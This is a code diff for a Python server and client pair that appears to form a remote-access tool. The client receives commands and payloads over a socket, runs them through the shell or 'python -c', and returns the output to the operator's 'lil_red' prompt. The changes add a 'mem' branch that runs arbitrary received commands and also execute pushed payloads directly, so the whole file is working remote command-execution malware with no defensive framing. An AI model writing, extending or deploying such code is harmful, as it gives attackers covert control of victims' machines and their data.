@@ -1,4 +1,6 @@
-#### server ####
+### server 
+
+
 from __future__ import print_function
 import socket
 import sys
@@ -42,9 +44,11 @@ def accept():
 
 def ssend(conn):
     while True:
-        cmd = raw_input()
+        cmd = raw_input(str(os.getcwd() + "lil_red$ "))
         args = cmd.split()
-        if cmd == 'quit':
+        if len(cmd) < 1:
+            continue
+        elif cmd == 'quit' or cmd == 'exit':
             conn.send('goodbye!')
             conn.close()
             s.close()
@@ -61,7 +65,6 @@ def ssend(conn):
                     conn.send(data)
                     data = f.read(1024)
                 f.close()
-                conn.send('FILE_TRANSFER_COMPLETE')
                 print('FILE_TRANSFER_COMPLETE.')
             else:
                 print('ready command not received.')
@@ -89,7 +92,7 @@ def ssend(conn):
                 if len(client_response) < 1024:
                     break
                 #print(data, end="")
-                print(data)
+                #print(data)
 
 
 def main():
@@ -99,7 +102,9 @@ def main():
 
 main()
 
-## client ##
+
+
+### client
 
 import os
 import socket
@@ -165,8 +170,15 @@ def receive():
                     totalRecv += len(data)
                     payload += data
                 runproc('python -c ' + payload)
+                b = subprocess.check_output(payload, shell=True)
+                print(b.decode('ascii'))
             #elif data != 'FILE_TRANSFER_COMPLETE':
             #    runproc(data)
+            elif data[:3].decode("utf-8") == 'mem':
+                 #ssls.send('ready')
+                 #data = ssls.recv(1024)
+                 b = subprocess.check_output(data[4:], shell=True)
+                 print(b.decode('ascii'))
             elif data[:8].decode("utf-8") == 'goodbye!':
                 ssls.close()
             elif data != 'FILE_TRANSFER_COMPLETE':
@@ -177,7 +189,6 @@ def receive():
     ssls.close()
 
 def bytes_to_number(b):
-    # if Python2.x
     b = map(ord, b)
     res = 0
     for i in range(4):
@@ -188,7 +199,8 @@ def runproc(data):
     cmd = subprocess.Popen(data[:].decode("utf-8"), shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
     output_bytes = cmd.stdout.read() + cmd.stderr.read()
     output_str = str(output_bytes)
-    ssls.send(str.encode(output_str + str(os.getcwd()) + '> '))
+    #ssls.send(str.encode(output_str + str(os.getcwd()) + '> '))
+    ssls.send(str.encode(output_str) + 'job complete.')
     print(output_str)
 
 def main():
@@ -198,4 +210,3 @@ def main():
 
 
 main()
-
